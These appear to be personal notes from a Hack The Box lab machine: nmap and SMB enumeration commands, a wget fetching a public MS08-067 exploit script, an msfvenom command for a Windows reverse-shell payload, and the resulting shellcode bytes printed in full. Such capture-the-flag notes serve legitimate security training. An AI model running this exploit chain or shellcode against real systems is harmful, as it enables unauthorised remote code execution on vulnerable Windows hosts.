https://app.hackthebox.com/machines/2

![[Pasted image 20231105122329.png]]
![[Pasted image 20231105122402.png]]
![[Pasted image 20231105122437.png]]

```
sudo nmap -p- --open -Pn 10.129.48.82 -oN enum/ports.nmap
```

![[Pasted image 20231105122713.png]]

```
sudo nmap -p135,139,445 -sCV -Pn 10.129.48.82 -oN enum/135-139-445-services.nmap
```

![[Pasted image 20231105123139.png]]

```
smbclient -L \\\\10.129.48.82\\
```

![[Pasted image 20231105123436.png]]

```
sudo nmap -p- -sT -sV -A 10.129.48.82
```

![[Pasted image 20231105142128.png]]

```
 sudo nmap -O -Pn 10.129.48.82 -oN enum/OS.nmap
```

![[Pasted image 20231105160635.png]]

```
sudo nmap --script=smb-os-discovery -Pn 10.129.48.82
```

![[Pasted image 20231105161223.png]]

```
wget -c https://raw.githubusercontent.com/andyacer/ms08_067/master/ms08_067_2018.py
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.129.48.82 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

![[Pasted image 20231105161736.png]]

```
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xc0\x15\xb5\xc6\x83\xee\xfc\xe2\xf4\x3c\xfd\x37\xc6"
"\xc0\x15\xd5\x4f\x25\x24\x75\xa2\x4b\x45\x85\x4d\x92\x19"
"\x3e\x94\xd4\x9e\xc7\xee\xcf\xa2\xff\xe0\xf1\xea\x19\xfa"
"\xa1\x69\xb7\xea\xe0\xd4\x7a\xcb\xc1\xd2\x57\x34\x92\x42"
"\x3e\x94\xd0\x9e\xff\xfa\x4b\x59\xa4\xbe\x23\x5d\xb4\x17"
"\x91\x9e\xec\xe6\xc1\xc6\x3e\x8f\xd8\xf6\x8f\x8f\x4b\x21"
"\x3e\xc7\x16\x24\x4a\x6a\x01\xda\xb8\xc7\x07\x2d\x55\xb3"
"\x36\x16\xc8\x3e\xfb\x68\x91\xb3\x24\x4d\x3e\x9e\xe4\x14"
"\x66\xa0\x4b\x19\xfe\x4d\x98\x09\xb4\x15\x4b\x11\x3e\xc7"
"\x10\x9c\xf1\xe2\xe4\x4e\xee\xa7\x99\x4f\xe4\x39\x20\x4a"
"\xea\x9c\x4b\x07\x5e\x4b\x9d\x7d\x86\xf4\xc0\x15\xdd\xb1"
"\xb3\x27\xea\x92\xa8\x59\xc2\xe0\xc7\xea\x60\x7e\x50\x14"
"\xb5\xc6\xe9\xd1\xe1\x96\xa8\x3c\x35\xad\xc0\xea\x60\x96"
"\x90\x45\xe5\x86\x90\x55\xe5\xae\x2a\x1a\x6a\x26\x3f\xc0"
"\x22\xac\xc5\x7d\xbf\x47\xf0\x47\xdd\xc4\xc0\x14\x0e\x4f"
"\x26\x7f\xa5\x90\x97\x7d\x2c\x63\xb4\x74\x4a\x13\x45\xd5"
"\xc1\xca\x3f\x5b\xbd\xb3\x2c\x7d\x45\x73\x62\x43\x4a\x13"
"\xa8\x76\xd8\xa2\xc0\x9c\x56\x91\x97\x42\x84\x30\xaa\x07"
"\xec\x90\x22\xe8\xd3\x01\x84\x31\x89\xc7\xc1\x98\xf1\xe2"
"\xd0\xd3\xb5\x82\x94\x45\xe3\x90\x96\x53\xe3\x88\x96\x43"
"\xe6\x90\xa8\x6c\x79\xf9\x46\xea\x60\x4f\x20\x5b\xe3\x80"
"\x3f\x25\xdd\xce\x47\x08\xd5\x39\x15\xae\x55\xdb\xea\x1f"
"\xdd\x60\x55\xa8\x28\x39\x15\x29\xb3\xba\xca\x95\x4e\x26"
"\xb5\x10\x0e\x81\xd3\x67\xda\xac\xc0\x46\x4a\x13"
```

```
sudo nmap --script smb-enum-shares -p445 10.129.200.70
```

![[Pasted image 20231106171631.png]]

```
sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.129.200.70
```

![[Pasted image 20231106171716.png]]

```
sudo nmap -p139 --script smb-protocols 10.129.200.70
```

![[Pasted image 20231106172327.png]]

```
sudo nmap -p445 --script smb-protocols 10.129.200.70
```

![[Pasted image 20231106172402.png]]

```
NT LM 0.12 (SMBv1) [dangerous, but default]
```

```
nmap --script=smb-protocols -p139,445 --open --reason -sV -Pn
nmap --script=smb-protocols -p445 --open --reason -sV -Pn
nmap --script=smb-protocols -p139 --open --reason -sV -Pn
```

![[Pasted image 20231106173003.png]]

